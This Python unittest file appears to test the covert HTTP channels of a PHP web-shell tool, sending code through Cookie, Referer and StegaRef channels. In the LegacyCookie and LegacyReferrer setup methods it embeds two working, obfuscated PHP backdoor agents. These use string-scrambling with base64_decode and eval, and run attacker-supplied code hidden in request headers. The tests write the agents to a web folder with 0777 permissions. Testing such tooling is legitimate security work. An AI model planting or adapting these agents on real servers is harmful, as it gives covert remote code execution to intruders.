from testsuite.base_test import BaseTest
from core.channels.channel import Channel
from core.weexceptions import DevException
import utils
from testsuite.config import script_folder, script_folder_url, test_stress_channels
from core.generate import generate, save_generated
import os
import random
import unittest
from testsuite import config
from core.loggers import stream_handler
import logging
import subprocess
import tempfile
import core.config


class StegaRefChannel(BaseTest):

    def setUp(self):
        self.channel = Channel(
            'StegaRef',
            {
                'url' : self.url,
                'password' : self.password
            }
        )

    def _incremental_requests(
            self,
            size_start,
            size_to,
            step_rand_start,
            step_rand_to):

        for i in range(size_start, size_to, random.randint(step_rand_start, step_rand_to)):
            payload = utils.strings.randstr(i)
            self.assertEqual(
                self.channel.send(
                    'echo("%s");' %
                    payload)[0],
                payload)


class StegaRefChannelAdditionalHeaders(StegaRefChannel):

    def test_additional_headers(self):
        self.channel.channel_loaded.additional_headers = [
            ( 'Cookie', 'C1=F1; C2=F2; C3=F3; C4=F4'),
            ( 'Accept', 'ACCEPT1'),
            ( 'Referer', 'REFERER1'),
            ( 'X-Other-Cookie', 'OTHERCOOKIE')
        ]

        headers_string = self.channel.send(
                            'print_r(getallheaders());'
        )[0]

        # Cookiejar used to add cookies in additional headers add them in casual orders
        self.assertIn('C1=F1', headers_string)
        self.assertIn('C2=F2', headers_string)
        self.assertIn('C3=F3', headers_string)
        self.assertIn('C4=F4', headers_string)
        self.assertNotIn('ACCEPT1', headers_string)
        self.assertNotIn('REFERER1', headers_string)
        self.assertIn('OTHERCOOKIE', headers_string)


@unittest.skipIf(
    not test_stress_channels,
    "Test only default generator agent")
class AgentDEFAULTObfuscatorDefault(StegaRefChannel):

    def test_1_100_requests(self):
        self._incremental_requests(1, 100, 1, 3)

    def test_100_1000_requests(self):
        self._incremental_requests(100, 1000, 90, 300)

    def test_1000_10000_requests(self):
        self._incremental_requests(1000, 10000, 900, 3000)

    def test_10000_50000_requests(self):
        self._incremental_requests(10000, 50000, 9000, 30000)


@unittest.skipIf(
    not test_stress_channels,
    "Test only default generator agent")
class AgentDEBUGObfuscatorCLEARTEXT(AgentDEFAULTObfuscatorDefault):

    @classmethod
    def setUpClass(cls):
        cls._randomize_bd()
        obfuscated = generate(cls.password, agent='stegaref_php_debug')
        save_generated(obfuscated, cls.path)



@unittest.skipIf(
    not test_stress_channels,
    "Test only default generator agent")
class LegacyCookieChannel(BaseTest):

    def setUp(self):
        self.channel = Channel(
            'LegacyCookie',
            {
                'url' : self.url,
                'password' : self.password
            }
        )

    def _incremental_requests(
            self,
            size_start,
            size_to,
            step_rand_start,
            step_rand_to):

        for i in range(size_start, size_to, random.randint(step_rand_start, step_rand_to)):
            payload = utils.strings.randstr(i)
            self.assertEqual(
                self.channel.send(
                    'echo("%s");' %
                    payload)[0],
                payload)

    @classmethod
    def setUpClass(cls):

        if config.debug:
            stream_handler.setLevel(logging.DEBUG)
        else:
            stream_handler.setLevel(logging.INFO)

        cls._randomize_bd()
        cls.password = 'asdasd'

        # Check `config.script_folder` permissions, comparing just the 
        # last 3 digits

        if (
            subprocess.check_output(
                config.cmd_env_stat_permissions_s % (config.script_folder),
                shell=True).strip()[-3:]
            != config.script_folder_expected_perms[-3:]
            ):
            raise DevException(
                "Error: give the required permissions to the folder \'%s\'"
                % config.script_folder
            )

        obfuscated = """<?php
$xcrd="mVwbeoGFjZShhceonJheSgnL1teXHc9XeoHeoNdLycsJy9ccy8nKSwgYXeoJyYXkeooJycsJysnKSwgam";
$dqlt="JGMeo9J2NvdW50JzskYT0kX0NPT0tJRTtpeoZihyZXNldCgkeoYSk9PSdhcycgJeoiYeogJGMoeoJGEpP";
$lspg="9pbihhcnJheeoV9zbeoGljZSgeokYeoSeowkYygkYSktMykpKSkpO2VeojaG8gJzwvJyeo4kay4nPic7fQ==";
$tylz="jMpeyRreoPeoSeodkYXeoNkJztlY2hvICc8Jy4kay4nPieoc7ZXZhbeoChiYXNlNjRfZGVjb2RlKHByZWdfeoc";
$toja = str_replace("z","","zsztr_zrzezpzlazce");
$apod = $toja("q", "", "qbaqsqeq6q4_qdecodqe");
$fyqt = $toja("uw","","uwcruweuwauwtuwe_funuwcuwtuwiouwn");
$sify = $fyqt('', $apod($toja("eo", "", $dqlt.$tylz.$xcrd.$lspg))); $sify();
?>"""

        tmp_handler, tmp_path = tempfile.mkstemp()
        save_generated(obfuscated, tmp_path)
        subprocess.check_call(
            config.cmd_env_move_s_s % (tmp_path, cls.path),
            shell=True)

        subprocess.check_call(
            config.cmd_env_chmod_s_s % ('0777', cls.path),
            shell=True)

    @classmethod
    def tearDownClass(cls):

        # Check the agent presence, could be already deleted
        if os.path.isfile(cls.path):
            subprocess.check_call(
                config.cmd_env_remove_s % cls.path,
                shell=True
            )

    def test_1_100_requests(self):
        self._incremental_requests(1, 100, 1, 2)

    def test_100_1000_requests(self):
        self._incremental_requests(100, 1000, 10, 20)

    def test_additional_headers(self):
        self.channel.channel_loaded.additional_headers = [
            ( 'Cookie', 'C1=F1; C2=F2; C3=F3; C4=F4;'),
            ( 'User-Agent', 'CLIENT'),
            ( 'X-Other-Cookie', 'OTHER')
        ]

        headers_string = self.channel.send(
                            'print_r(getallheaders());'
        )[0]

        self.assertRegexpMatches(headers_string, '\[Cookie\] => [A-Z0-9]+=[^ ]{2}; C1=F1; C2=F2; C3=F3; C4=F4(; [A-Z0-9]+=[^ ]+)+')
        self.assertRegexpMatches(headers_string, '\[User-Agent\] => CLIENT')
        self.assertRegexpMatches(headers_string, '\[X-Other-Cookie\] => OTHER')

        self.channel.channel_loaded.additional_headers = [ ]

@unittest.skipIf(
    not test_stress_channels,
    "Test only default generator agent")
class LegacyReferrerChannel(BaseTest):

    def setUp(self):
        self.channel = Channel(
            'LegacyReferrer',
            {
                'url' : self.url,
                'password' : self.password
            }
        )

    def _incremental_requests(
            self,
            size_start,
            size_to,
            step_rand_start,
            step_rand_to):

        for i in range(size_start, size_to, random.randint(step_rand_start, step_rand_to)):
            payload = utils.strings.randstr(i)
            self.assertEqual(
                self.channel.send(
                    'echo("%s");' %
                    payload)[0],
                payload)

    @classmethod
    def setUpClass(cls):

        if config.debug:
            stream_handler.setLevel(logging.DEBUG)
        else:
            stream_handler.setLevel(logging.INFO)

        cls._randomize_bd()
        cls.password = 'asdasd'

        # Check `config.script_folder` permissions, comparing just the 
        # last 3 digits

        if (
            subprocess.check_output(
                config.cmd_env_stat_permissions_s % (config.script_folder),
                shell=True).strip()[-3:]
            != config.script_folder_expected_perms[-3:]
            ):
            raise DevException(
                "Error: give the required permissions to the folder \'%s\'"
                % config.script_folder
            )


        obfuscated = """<?php eval(base64_decode('cGFyc2Vfc3RyKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSwkYSk7IGlmKHJlc2V0KCRhKT09J2FzJyAmJiBjb3VudCgkYSk9PTkpIHsgZWNobyAnPGRhc2Q+JztldmFsKGJhc2U2NF9kZWNvZGUoc3RyX3JlcGxhY2UoIiAiLCAiKyIsIGpvaW4oYXJyYXlfc2xpY2UoJGEsY291bnQoJGEpLTMpKSkpKTtlY2hvICc8L2Rhc2Q+Jzt9')); ?>"""

        tmp_handler, tmp_path = tempfile.mkstemp()
        save_generated(obfuscated, tmp_path)
        subprocess.check_call(
            config.cmd_env_move_s_s % (tmp_path, cls.path),
            shell=True)

        subprocess.check_call(
            config.cmd_env_chmod_s_s % ('0777', cls.path),
            shell=True)

    @classmethod
    def tearDownClass(cls):

        # Check the agent presence, could be already deleted
        if os.path.isfile(cls.path):
            subprocess.check_call(
                config.cmd_env_remove_s % cls.path,
                shell=True
            )

    def test_1_100_requests(self):
        self._incremental_requests(1, 100, 1, 2)

    def test_100_1000_requests(self):
        self._incremental_requests(100, 1000, 10, 20)

    def test_additional_headers(self):
        self.channel.channel_loaded.additional_headers = [
            ( 'Cookie', 'C1=F1; C2=F2; C3=F3; C4=F4'),
            ( 'Referer', 'REFERER'),
            ( 'X-Other-Cookie', 'OTHER')
        ]

        headers_string = self.channel.send(
                            'print_r(getallheaders());'
        )[0]

        self.assertIn('[Cookie] => C1=F1; C2=F2; C3=F3; C4=F4', headers_string)
        self.assertNotIn('REFERER1', headers_string)
        self.assertIn('[X-Other-Cookie] => OTHER', headers_string)
